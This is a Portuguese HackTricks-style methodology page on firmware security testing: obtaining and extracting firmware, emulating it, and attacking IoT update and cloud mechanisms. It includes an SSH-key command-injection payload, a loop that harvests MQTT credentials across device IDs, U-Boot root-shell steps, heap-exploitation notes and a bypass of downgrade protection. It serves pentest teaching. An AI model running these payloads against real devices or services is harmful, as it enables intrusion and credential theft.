# Análise de Firmware

{{#include ../../banners/hacktricks-training.md}}

## **Introdução**

### Recursos relacionados


{{#ref}}
synology-encrypted-archive-decryption.md
{{#endref}}

{{#ref}}
../../network-services-pentesting/32100-udp-pentesting-pppp-cs2-p2p-cameras.md
{{#endref}}

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

{{#ref}}
mediatek-xflash-carbonara-da2-hash-bypass.md
{{#endref}}

Firmware é um software essencial que permite que os dispositivos operem corretamente, gerenciando e facilitando a comunicação entre os componentes de hardware e o software com o qual os usuários interagem. Ele é armazenado em memória permanente, garantindo que o dispositivo possa acessar instruções vitais desde o momento em que é ligado, levando ao lançamento do sistema operacional. Examinar e potencialmente modificar o firmware é uma etapa crítica na identificação de vulnerabilidades de segurança.

## **Coleta de informações**

A **coleta de informações** é uma etapa inicial crítica para entender a composição de um dispositivo e as tecnologias que ele utiliza. Esse processo envolve coletar dados sobre:

- A arquitetura da CPU e o sistema operacional executado
- Detalhes do bootloader
- Layout do hardware e datasheets
- Métricas da base de código e locais do código-fonte
- Bibliotecas externas e tipos de licença
- Históricos de atualizações e certificações regulatórias
- Diagramas de arquitetura e fluxo
- Avaliações de segurança e vulnerabilidades identificadas

Para essa finalidade, as ferramentas de **open-source intelligence (OSINT)** são inestimáveis, assim como a análise de quaisquer componentes de software open-source disponíveis por meio de processos de revisão manuais e automatizados. Ferramentas como [Coverity Scan](https://scan.coverity.com) e [Semmle’s LGTM](https://lgtm.com/#explore) oferecem análise estática gratuita que pode ser utilizada para encontrar possíveis problemas.

## **Obtenção do Firmware**

A obtenção do firmware pode ser realizada por vários meios, cada um com seu próprio nível de complexidade:

- **Diretamente** da fonte (desenvolvedores, fabricantes)
- **Compilando-o** a partir das instruções fornecidas
- **Baixando-o** de sites oficiais de suporte
- Utilizando consultas de **Google dork** para encontrar arquivos de firmware hospedados
- Acessando diretamente o **cloud storage**, com ferramentas como [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Interceptando **atualizações** por meio de técnicas man-in-the-middle
- **Extraindo-o** do dispositivo por meio de conexões como **UART**, **JTAG** ou **PICit**
- **Capturando** solicitações de atualização na comunicação do dispositivo
- Identificando e utilizando **endpoints de atualização hardcoded**
- **Fazendo dump** a partir do bootloader ou da rede
- **Removendo e lendo** o chip de armazenamento, quando todas as outras opções falharem, usando ferramentas de hardware apropriadas

### Logs apenas via UART: force um root shell usando o U-Boot env na flash

Se o UART RX for ignorado (apenas logs), ainda é possível forçar um init shell **editando o blob do ambiente do U-Boot** offline:

1. Faça um dump da SPI flash usando um clip SOIC-8 + programmer (3.3V):
```bash
flashrom -p ch341a_spi -r flash.bin
```
2. Localize a partição de U-Boot env, edite `bootargs` para incluir `init=/bin/sh` e **recalcule o CRC32 do U-Boot env** para o blob.
3. Regrave apenas a partição env e reinicie; um shell deverá aparecer no UART.

Isso é útil em dispositivos embedded nos quais o shell do bootloader está desabilitado, mas a partição env pode ser gravada por meio de acesso externo à flash.

## Analisando o firmware

Agora que você **tem o firmware**, é necessário extrair informações sobre ele para saber como tratá-lo. Existem diferentes ferramentas que você pode usar para isso:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```
Se você não encontrar muita coisa com essas ferramentas, verifique a **entropia** da imagem com `binwalk -E <bin>`; se a entropia for baixa, provavelmente ela não está criptografada. Se a entropia for alta, provavelmente está criptografada (ou comprimida de alguma forma).

Além disso, você pode usar estas ferramentas para extrair **arquivos incorporados no firmware**:


{{#ref}}
../../generic-methodologies-and-resources/basic-forensic-methodology/partitions-file-systems-carving/file-data-carving-recovery-tools.md
{{#endref}}

Ou o [**binvis.io**](https://binvis.io/#/) ([código](https://code.google.com/archive/p/binvis/)) para inspecionar o arquivo.

### Obtendo o sistema de arquivos

Com as ferramentas comentadas anteriormente, como `binwalk -ev <bin>`, você deveria ter conseguido **extrair o sistema de arquivos**.\
O Binwalk normalmente o extrai dentro de uma **pasta nomeada de acordo com o tipo do sistema de arquivos**, que geralmente é um dos seguintes: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Extração manual do sistema de arquivos

Às vezes, o binwalk **não terá o magic byte do sistema de arquivos em suas assinaturas**. Nesses casos, use o binwalk para **encontrar o offset do sistema de arquivos e fazer o carve do sistema de arquivos comprimido** a partir do binário e **extrair manualmente** o sistema de arquivos de acordo com seu tipo, usando as etapas abaixo.
```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```
Execute o seguinte **comando dd** para extrair o sistema de arquivos Squashfs.
```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```
Alternativamente, o seguinte comando também pode ser executado.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Para squashfs (usado no exemplo acima)

`$ unsquashfs dir.squashfs`

Os arquivos estarão no diretório "`squashfs-root`" posteriormente.

- Arquivos de archive CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Para filesystems jffs2

`$ jefferson rootfsfile.jffs2`

- Para filesystems ubifs com memória flash NAND

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

## Analisando o Firmware

Depois que o firmware for obtido, é essencial dissecá-lo para entender sua estrutura e suas potenciais vulnerabilidades. Esse processo envolve a utilização de várias ferramentas para analisar e extrair dados valiosos da imagem do firmware.

### Ferramentas de Análise Inicial

Um conjunto de comandos é fornecido para a inspeção inicial do arquivo binário (referido como `<bin>`). Esses comandos ajudam a identificar tipos de arquivo, extrair strings, analisar dados binários e entender os detalhes das partições e do filesystem:
```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```
Para avaliar o status de criptografia da imagem, a **entropia** é verificada com `binwalk -E <bin>`. Entropia baixa sugere ausência de criptografia, enquanto entropia alta indica possível criptografia ou compressão.

Para extrair **arquivos incorporados**, são recomendados ferramentas e recursos como a documentação **file-data-carving-recovery-tools** e o **binvis.io** para inspeção de arquivos.

### Extraindo o Sistema de Arquivos

Usando `binwalk -ev <bin>`, geralmente é possível extrair o sistema de arquivos, normalmente para um diretório nomeado de acordo com o tipo de sistema de arquivos (por exemplo, squashfs, ubifs). No entanto, quando o **binwalk** não consegue reconhecer o tipo de sistema de arquivos devido à ausência de magic bytes, é necessária a extração manual. Isso envolve usar o `binwalk` para localizar o offset do sistema de arquivos e, em seguida, o comando `dd` para extrair o sistema de arquivos:
```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```
Depois, dependendo do tipo de filesystem (por exemplo, squashfs, cpio, jffs2, ubifs), diferentes comandos são usados para extrair manualmente o conteúdo.

### Análise do Filesystem

Com o filesystem extraído, começa a busca por falhas de segurança. É dada atenção a network daemons inseguros, credenciais hardcoded, API endpoints, funcionalidades do update server, código não compilado, startup scripts e binários compilados para análise offline.

**Principais localizações** e **itens** a inspecionar incluem:

- **etc/shadow** e **etc/passwd** para credenciais de usuários
- Certificados e chaves SSL em **etc/ssl**
- Arquivos de configuração e scripts em busca de possíveis vulnerabilidades
- Binários incorporados para análise adicional
- Web servers e binários comuns de dispositivos IoT

Várias ferramentas ajudam a descobrir informações sensíveis e vulnerabilidades dentro do filesystem:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) e [**Firmwalker**](https://github.com/craigz28/firmwalker) para busca de informações sensíveis
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) para análise abrangente de firmware
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) e [**EMBA**](https://github.com/e-m-b-a/emba) para análise estática e dinâmica

### Verificações de Segurança em Binários Compilados

Tanto o código-fonte quanto os binários compilados encontrados no filesystem devem ser examinados em busca de vulnerabilidades. Ferramentas como **checksec.sh** para binários Unix e **PESecurity** para binários Windows ajudam a identificar binários desprotegidos que poderiam ser explorados.

## Coleta de configurações cloud e credenciais MQTT por meio de tokens de URL derivados

Muitos hubs IoT obtêm sua configuração específica de cada dispositivo a partir de um endpoint cloud semelhante a:

- `https://<api-host>/pf/<deviceId>/<token>`

Durante a análise de firmware, você pode descobrir que `<token>` é derivado localmente do device ID usando um segredo hardcoded, por exemplo:

- token = MD5( deviceId || STATIC_KEY ) e representado como hexadecimal em maiúsculas

Esse design permite que qualquer pessoa que descubra um deviceId e o STATIC_KEY reconstrua a URL e obtenha a configuração cloud, frequentemente revelando credenciais MQTT em plaintext e prefixos de tópicos.

Fluxo de trabalho prático:

1) Extraia o deviceId dos boot logs da UART

- Conecte um adaptador UART de 3,3 V (TX/RX/GND) e capture os logs:
```bash
picocom -b 115200 /dev/ttyUSB0
```
- Procure por linhas que exibam o padrão de URL da configuração da cloud e o endereço do broker, por exemplo:
```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```
2) Recuperar STATIC_KEY e o algoritmo do token a partir do firmware

- Carregue os binários no Ghidra/radare2 e procure o caminho de configuração ("/pf/") ou o uso de MD5.
- Confirme o algoritmo (por exemplo, MD5(deviceId||STATIC_KEY)).
- Derive o token no Bash e converta o digest para maiúsculas:
```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```
3) Coletar configurações de cloud e credenciais de MQTT

- Componha a URL e obtenha o JSON com curl; analise-o com jq para extrair secrets:
```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```
4) Abuse de MQTT em texto claro e ACLs fracas de tópicos (se presentes)

- Use as credenciais recuperadas para se inscrever em tópicos de manutenção e procurar eventos sensíveis:
```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
-i <client_id> -u <username> -P <password> \
-t "<topic_prefix>/<deviceId>/admin" -v
```
5) Enumerar IDs de dispositivos previsíveis (em escala, com autorização)

- Muitos ecossistemas incorporam bytes de OUI/produto/tipo seguidos por um sufixo sequencial.
- Você pode iterar pelos IDs candidatos, derivar tokens e obter configs programaticamente:
```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
DEVICE_ID="${PREFIX}${SUF}"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```
Notas
- Sempre obtenha autorização explícita antes de tentar realizar enumeração em massa.
- Prefira a emulação ou a análise estática para recuperar secrets sem modificar o hardware alvo, quando possível.


O processo de emulação de firmware permite a **análise dinâmica** da operação de um dispositivo ou de um programa individual. Essa abordagem pode enfrentar desafios relacionados a dependências de hardware ou arquitetura, mas transferir o root filesystem ou binários específicos para um dispositivo com arquitetura e endianness compatíveis, como um Raspberry Pi, ou para uma máquina virtual pré-criada, pode facilitar testes adicionais.

### Emulating Individual Binaries

Para examinar programas individuais, é essencial identificar o endianness e a arquitetura de CPU do programa.

#### Example with MIPS Architecture

Para emular um binário de arquitetura MIPS, pode-se usar o comando:
```bash
file ./squashfs-root/bin/busybox
```
E para instalar as ferramentas de emulação necessárias:
```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```
Para MIPS (big-endian), `qemu-mips` é usado, e para binários little-endian, `qemu-mipsel` seria a escolha.

#### Emulação da Arquitetura ARM

Para binários ARM, o processo é semelhante, com o emulador `qemu-arm` sendo utilizado para a emulação.

### Emulação de Sistema Completo

Ferramentas como [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) e outras facilitam a emulação completa de firmware, automatizando o processo e auxiliando na análise dinâmica.

## Análise Dinâmica na Prática

Nesta etapa, um ambiente de dispositivo real ou emulado é usado para análise. É essencial manter acesso ao shell do OS e ao filesystem. A emulação pode não reproduzir perfeitamente as interações com o hardware, exigindo reinicializações ocasionais da emulação. A análise deve revisar novamente o filesystem, explorar webpages e serviços de rede expostos e investigar vulnerabilidades do bootloader. Testes de integridade do firmware são essenciais para identificar possíveis vulnerabilidades de backdoor.

## Técnicas de Análise em Runtime

A análise em runtime envolve interagir com um processo ou binário em seu ambiente operacional, usando ferramentas como gdb-multiarch, Frida e Ghidra para definir breakpoints e identificar vulnerabilidades por meio de fuzzing e outras técnicas.

Para targets embarcados sem um debugger completo, **copie um `gdbserver` compilado estaticamente** para o dispositivo e faça o attach remotamente:
```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```
### Mapeamento de mensagens Zigbee / radio-co-processor

Em hubs IoT, a stack de RF geralmente é dividida entre um **radio MCU** e um processo de userland Linux. Um workflow útil é mapear o caminho:

1. **RF frame** no ar
2. **controller-side parser** no radio MCU
3. **serial/UART text or TLV protocol** encaminhado ao Linux (por exemplo, `/dev/tty*`)
4. **application dispatcher** no daemon principal
5. **protocol-specific handler / state machine**

Essa arquitetura cria dois alvos de reversing em vez de um. Se o controller converte binary radio frames em um protocolo textual como `Group,Command,arg1,arg2,...`, recupere:

- Os **message groups** e as dispatch tables
- Quais mensagens podem vir da **network** versus do próprio controller
- Os campos exatos de discriminação **manufacturer-specific** (por exemplo, Zigbee `manufacturer_code` e `cluster_command` customizado)
- Quais handlers só podem ser alcançados durante fases de **commissioning**, discovery ou download de firmware/model

Especificamente para Zigbee, capture o tráfego de pairing e verifique se o alvo ainda depende do **Link Key** padrão `ZigBeeAlliance09`. Nesse caso, sniffing do tráfego de commissioning pode expor a **Network Key**. Os install codes do Zigbee 3.0 reduzem essa exposição; portanto, observe se o dispositivo testado realmente os aplica.

### Handlers de protocolos manufacturer-specific e reachability controlada por FSM

Comandos Zigbee/ZCL específicos do vendor geralmente são um alvo melhor do que clusters padronizados, pois alimentam **custom parsing code** e **FSMs** internas com validação menos testada.

Workflow prático:

- Faça reversing do command dispatcher até encontrar o **vendor-only handler**.
- Recupere as tabelas de **FSM state**, **event**, **check**, **action** e **next-state**.
- Identifique **transitional states** que avançam automaticamente e branches de retry/error que eventualmente resetam ou liberam estado controlado pelo atacante.
- Confirme quais trocas legítimas do protocolo são necessárias para colocar o daemon no estado vulnerável, em vez de presumir que o buggy handler está sempre acessível.

Para protocolos sensíveis a timing, o packet replay de um framework Python pode ser lento demais. Uma abordagem mais confiável é emular um dispositivo legítimo em hardware real (por exemplo, um **nRF52840**) com uma stack de nível vendor, para expor os **endpoints**, **attributes** e o timing correto de commissioning.

### Classe de bug de fragmented-download em embedded daemons

Uma classe recorrente de bugs de firmware aparece em downloads de **fragmented blob/model/configuration**:

1. O **first fragment** (`offset == 0`) armazena `ctx->total_size` e aloca `malloc(total_size)`.
2. Os fragmentos posteriores validam apenas campos **packet-local** controlados pelo atacante, como `packet_total_size >= offset + chunk_len`.
3. A cópia usa `memcpy(&ctx->buffer[offset], chunk, chunk_len)` sem verificar contra o **original allocated size**.

Isso permite que um atacante envie:

- Um primeiro fragmento válido com um **small** total size declarado, forçando uma pequena alocação no heap.
- Um fragmento posterior com o **expected offset**, mas com um `chunk_len` maior.
- Um packet-local size forjado que satisfaz as verificações atuais, enquanto ainda causa overflow no buffer originalmente alocado.

Quando o caminho vulnerável está atrás de lógica de commissioning, a exploração deve incluir **device emulation** suficiente para conduzir o alvo ao estado esperado de model-download ou blob-download antes de enviar os fragmentos malformados.

### Gatilhos de `free()` controlados pelo protocolo

Em embedded daemons, a forma mais fácil de acionar heap metadata exploitation geralmente não é "wait for cleanup", mas **forçar o próprio tratamento de erros do protocolo**:

- Envie follow-up fragments malformados para levar a FSM aos estados de **retry** ou **error**.
- Exceda o limite de retry para que o daemon **resete o contexto** e libere o buffer corrompido.
- Use esse `free()` previsível para acionar primitives do allocator antes que o processo falhe por motivos não relacionados.

Isso é especialmente útil contra allocators **musl/uClibc/dlmalloc-like** em embedded Linux, nos quais corromper chunk metadata pode transformar a lógica de unlink/unbin em uma write primitive. Um padrão estável é corromper um **size field** para redirecionar a travessia do allocator para **fake chunks staged inside the overflowed buffer**, em vez de sobrescrever imediatamente bin pointers reais e causar o crash do processo.

## Exploração de Binários e Proof-of-Concept

Desenvolver um PoC para vulnerabilidades identificadas exige um entendimento profundo da arquitetura do alvo e programação em linguagens de nível inferior. Proteções de runtime de binários em embedded systems são raras, mas, quando presentes, técnicas como Return Oriented Programming (ROP) podem ser necessárias.

### Notas sobre exploração de uClibc fastbin (embedded Linux)

- **Fastbins + consolidation:** uClibc usa fastbins semelhantes aos do glibc. Uma alocação grande posterior pode acionar `__malloc_consolidate()`, portanto qualquer fake chunk deve sobreviver às verificações (tamanho válido, `fd = 0` e chunks adjacentes considerados "in use").
- **Non-PIE binaries under ASLR:** se ASLR estiver habilitado, mas o binário principal for **non-PIE**, os endereços `.data/.bss` dentro do binário são estáveis. Você pode direcionar uma região que já se pareça com um header válido de heap chunk para fazer uma fastbin allocation cair sobre uma **function pointer table**.
- **Parser-stopping NUL:** quando JSON é analisado, um `\x00` no payload pode interromper o parsing e manter bytes controlados pelo atacante no final para um stack pivot/ROP chain.
- **Shellcode via `/proc/self/mem`:** uma ROP chain que chama `open("/proc/self/mem")`, `lseek()` e `write()` pode inserir shellcode executável em um mapping conhecido e saltar para ele.

## Sistemas Operacionais Preparados para Firmware Analysis

Sistemas operacionais como [AttifyOS](https://github.com/adi0x90/attifyos) e [EmbedOS](https://github.com/scriptingxss/EmbedOS) fornecem ambientes pré-configurados para firmware security testing, equipados com as ferramentas necessárias.

## OSs Preparados para analisar Firmware

- [**AttifyOS**](https://github.com/adi0x90/attifyos): AttifyOS é uma distro destinada a ajudar na realização de security assessment e penetration testing de dispositivos Internet of Things (IoT). Ela economiza bastante tempo ao fornecer um ambiente pré-configurado com todas as ferramentas necessárias carregadas.
- [**EmbedOS**](https://github.com/scriptingxss/EmbedOS): sistema operacional de embedded security testing baseado no Ubuntu 18.04, pré-carregado com ferramentas de firmware security testing.

## Ataques de Firmware Downgrade e Mecanismos de Update Inseguros

Mesmo quando um vendor implementa verificações de cryptographic signature para imagens de firmware, a **proteção contra version rollback (downgrade) é frequentemente omitida**. Quando o boot- ou recovery-loader verifica apenas a signature com uma public key incorporada, mas não compara a *version* (ou um contador monotônico) da imagem que está sendo gravada, um atacante pode instalar legitimamente um **firmware mais antigo e vulnerável que ainda possui uma assinatura válida**, reintroduzindo assim vulnerabilidades corrigidas.

Workflow típico do ataque:

1. **Obtenha uma imagem antiga assinada**
* Baixe-a do portal público de downloads, CDN ou site de suporte do vendor.
* Extraia-a de companion mobile/desktop applications (por exemplo, dentro de um Android APK em `assets/firmware/`).
* Recupere-a de repositórios de terceiros, como VirusTotal, Internet archives, fóruns etc.
2. **Faça upload ou sirva a imagem ao dispositivo** por qualquer update channel exposto:
* Web UI, mobile-app API, USB, TFTP, MQTT etc.
* Muitos dispositivos IoT de consumo expõem endpoints HTTP(S) *não autenticados* que aceitam firmware blobs codificados em Base64, fazem o decode no lado do servidor e acionam recovery/upgrade.
3. Após o downgrade, explore uma vulnerabilidade corrigida na release mais recente (por exemplo, um filtro de command-injection adicionado posteriormente).
4. Opcionalmente, grave novamente a imagem mais recente ou desabilite os updates para evitar detecção depois de obter persistence.

### Exemplo: Command Injection Após Downgrade
```http
POST /check_image_and_trigger_recovery?md5=1; echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC...' >> /root/.ssh/authorized_keys HTTP/1.1
Host: 192.168.0.1
Content-Type: application/octet-stream
Content-Length: 0
```
No firmware vulnerável (rebaixado), o parâmetro `md5` é concatenado diretamente em um comando shell sem sanitização, permitindo a injeção de comandos arbitrários (neste caso – habilitando o acesso root baseado em chaves SSH). Versões posteriores do firmware introduziram um filtro básico de caracteres, mas a ausência de proteção contra downgrade torna a correção ineficaz.

### Extraindo Firmware de Aplicativos Móveis

Muitos vendors incluem imagens completas de firmware em seus aplicativos móveis companion para que o app possa atualizar o dispositivo via Bluetooth/Wi-Fi. Esses pacotes normalmente são armazenados sem criptografia no APK/APEX, em caminhos como `assets/fw/` ou `res/raw/`. Ferramentas como `apktool`, `ghidra` ou até mesmo o simples `unzip` permitem extrair imagens assinadas sem acessar fisicamente o hardware.
```
$ apktool d vendor-app.apk -o vendor-app
$ ls vendor-app/assets/firmware
firmware_v1.3.11.490_signed.bin
```
### Bypass de anti-rollback exclusivo do updater em designs de slot A/B

Alguns vendors implementam um **ratchet** anti-downgrade, mas apenas dentro da lógica do *updater* (por exemplo, uma rotina UDS sobre CAN, um comando de recovery ou um agente OTA em userspace). Se o **bootloader** verificar posteriormente apenas a assinatura/CRC da imagem e confiar na tabela de partições ou nos metadados do slot, a proteção contra rollback ainda poderá ser bypassada.

Design fraco típico:

- Os metadados do firmware contêm um descritor de versão e um **security ratchet** / contador monotônico.
- O updater compara o ratchet da imagem com um valor armazenado em armazenamento persistente e rejeita imagens assinadas mais antigas.
- O bootloader **não** analisa esse ratchet e apenas verifica o header, o CRC e a assinatura antes de inicializar.
- A ativação do slot é armazenada separadamente em uma tabela de partições ou em um contador de geração por slot e **não está vinculada criptograficamente** ao digest exato do firmware que foi validado.

Isso cria uma primitiva de **validar uma imagem / inicializar outra imagem** em sistemas de slot duplo. Se o atacante conseguir fazer o updater marcar o slot B como próximo alvo de boot usando uma imagem assinada atual e puder sobrescrever o slot B antes do reboot, o bootloader ainda poderá inicializar a imagem downgraded, pois confia apenas nos metadados de slot já confirmados.

Padrão comum de abuso:

1. Faça upload de um firmware **assinado atual** no slot passivo e execute a rotina normal de validação/troca, para que o layout marque esse slot como o próximo ativo.
2. **Não faça reboot ainda**. Entre novamente na rotina de preparação/erase do slot na mesma sessão.
3. Abuse da lógica de estado de boot obsoleto ou de seleção de slot obsoleta para que o updater apague o **mesmo slot físico** que acabou de ser promovido.
4. Grave um firmware **mais antigo, mas ainda assinado** nesse slot.
5. Ignore a rotina de validação que aplica o ratchet e faça reboot diretamente.
6. O bootloader seleciona o slot promovido, verifica apenas assinatura/integridade e inicializa a imagem antiga.

Aspectos a procurar ao fazer reverse engineering de implementações de update A/B:

- Seleção de slot derivada de **flags de boot** que não são atualizadas após uma troca bem-sucedida.
- Uma rotina no estilo `prepare_passive_slot()` que apaga um slot com base em estado obsoleto, em vez do **layout confirmado atual**.
- Uma função no estilo `part_write_layout()` que apenas incrementa um **contador de geração** / flag de ativo e não armazena o hash da imagem validada.
- Verificações de ratchet implementadas em userspace ou no código do updater, mas **não** em ROM / bootloader / estágios de secure boot.
- Rotinas de erase ou recovery que deixam o slot marcado como inicializável mesmo depois que seu conteúdo foi removido e regravado.

### Checklist para avaliar a lógica de update

* O transporte/autenticação do *update endpoint* está adequadamente protegido (TLS + autenticação)?
* O dispositivo compara **números de versão** ou um **contador monotônico anti-rollback** antes de fazer o flashing?
* A imagem é verificada dentro de uma cadeia de secure boot (por exemplo, assinaturas verificadas pelo código ROM)?
* O **bootloader aplica o mesmo ratchet** que o updater, em vez de verificar apenas assinatura/CRC?
* Os metadados de ativação do slot estão **vinculados ao digest/versão do firmware validado**, ou um slot pode ser modificado após a promoção?
* Depois que uma troca de slot é bem-sucedida, o dispositivo é forçado a fazer reboot ou as rotinas posteriores de update/erase continuam acessíveis na mesma sessão?
* O código em userland realiza verificações adicionais de sanidade (por exemplo, mapa de partições permitido, número do modelo)?
* Os fluxos de update *partial* ou de *backup* reutilizam a mesma lógica de validação?

> 💡  Se algum dos itens acima estiver ausente, a plataforma provavelmente estará vulnerável a ataques de rollback.

## Firmware vulnerável para praticar

Para praticar a descoberta de vulnerabilidades em firmware, use os seguintes projetos de firmware vulnerável como ponto de partida.

- OWASP IoTGoat
- [https://github.com/OWASP/IoTGoat](https://github.com/OWASP/IoTGoat)
- The Damn Vulnerable Router Firmware Project
- [https://github.com/praetorian-code/DVRF](https://github.com/praetorian-code/DVRF)
- Damn Vulnerable ARM Router (DVAR)
- [https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html](https://blog.exploitlab.net/2018/01/dvar-damn-vulnerable-arm-router.html)
- ARM-X
- [https://github.com/therealsaumil/armx#downloads](https://github.com/therealsaumil/armx#downloads)
- Azeria Labs VM 2.0
- [https://azeria-labs.com/lab-vm-2-0/](https://azeria-labs.com/lab-vm-2-0/)
- Damn Vulnerable IoT Device (DVID)
- [https://github.com/Vulcainreo/DVID](https://github.com/Vulcainreo/DVID)

## Recuperação de chaves de decryption do firmware a partir do estado de KMS/Vault incorporado

Quando uma imagem de update mistura pequenos metadados em plaintext com um grande blob de alta entropia, faça a triagem do container antes de tentar qualquer brute force:

- Extraia headers, offsets e limites de linha com `hexdump`, `xxd`, `strings -tx`, `base64 -d` e `binwalk -E`.
- `Salted__` normalmente indica o formato `enc` do OpenSSL: os 8 bytes seguintes são o salt e os bytes restantes são o ciphertext.
- Um campo Base64 que decodifica exatamente para `256` bytes é um forte indício de que você está vendo um ciphertext RSA-2048 que encapsula uma senha/chave de sessão aleatória do firmware.
- Material PGP detached no mesmo arquivo geralmente protege apenas a autenticidade; não presuma que seja o mecanismo de confidencialidade.

Se a busca por chaves estáticas (`grep`, `strings`, buscas por PEM/PGP) falhar, faça reverse engineering do **caminho operacional de decrypt**, em vez de apenas procurar chaves privadas:

- Faça decompilation do binário do updater / management e rastreie quem lê o blob encrypted, qual helper/API faz o unwrap e qual nome lógico de chave ele solicita.
- Pesquise no root filesystem extraído por estado de KMS (`vault/`, `transit/`, `pkcs11`, `keystore`, `sealed-secrets`), além de unit files e init scripts.
- Trate comandos plaintext `vault operator unseal ...`, recovery keys, bootstrap tokens ou scripts locais de auto-unseal do KMS como equivalentes a material de chave privada.

Se o appliance fornecer o binário original do Vault e o storage backend, reproduzir esse ambiente normalmente será mais fácil do que reimplementar os internals do Vault:
```bash
vault server -config=/tmp/vault.hcl
vault operator unseal <share1>
vault operator unseal <share2>
vault operator unseal <share3>

OTP=$(vault operator generate-root -generate-otp)
INIT=$(vault operator generate-root -init -otp="$OTP" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
NONCE=$(printf '%s\n' "$INIT" | awk '/Nonce/ {print $2}')
vault operator generate-root -nonce="$NONCE" "<share1>"
vault operator generate-root -nonce="$NONCE" "<share2>"
FINAL=$(vault operator generate-root -nonce="$NONCE" "<share3>" 2>&1 | sed 's/\x1b\[[0-9;]*m//g')
TOKEN=$(vault operator generate-root -decode="$(printf '%s\n' "$FINAL" | awk '/Root Token/ {print $3}')" -otp="$OTP")
```
Com root no KMS clonado:

- Torne as transit keys exportable somente dentro do clone isolado: `vault write transit/keys/<name>/config exportable=true`
- Exporte a unwrap key: `vault read transit/export/encryption-key/<name>`
- Teste a chave RSA recuperada usando o par exato de padding/hash usado pelo KMS. Uma falha na descriptografia PKCS#1 v1.5 e uma falha na descriptografia OAEP padrão **não** provam que a chave está errada; muitos fluxos baseados no Vault usam OAEP com SHA-256, enquanto bibliotecas comuns usam SHA-1 por padrão.
- Se o payload começar com `Salted__`, reproduza exatamente o KDF do OpenSSL usado pelo fornecedor (`EVP_BytesToKey`, geralmente MD5 em appliances legados) antes de tentar a descriptografia AES-CBC.

Isso transforma o problema de "firmware criptografado" em um problema mais geral: **recupere as operational keys do appliance e, em seguida, reproduza offline exatamente os parâmetros de unwrap + KDF**.

## Treinamento e Certificação

- [https://www.attify-store.com/products/offensive-iot-exploitation](https://www.attify-store.com/products/offensive-iot-exploitation)

## Referências

- [Cracking Firmware with Claude: Senior-Level Skill, Junior-Level Autonomy](https://bishopfox.com/blog/cracking-firmware-with-claude-senior-level-skill-junior-level-autonomy)
- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things](https://www.amazon.co.uk/Practical-IoT-Hacking-F-Chantzis/dp/1718500904)
- [Exploiting zero days in abandoned hardware – Trail of Bits blog](https://blog.trailofbits.com/2025/07/25/exploiting-zero-days-in-abandoned-hardware/)
- [How a $20 Smart Device Gave Me Access to Your Home](https://bishopfox.com/blog/how-a-20-smart-device-gave-me-access-to-your-home)
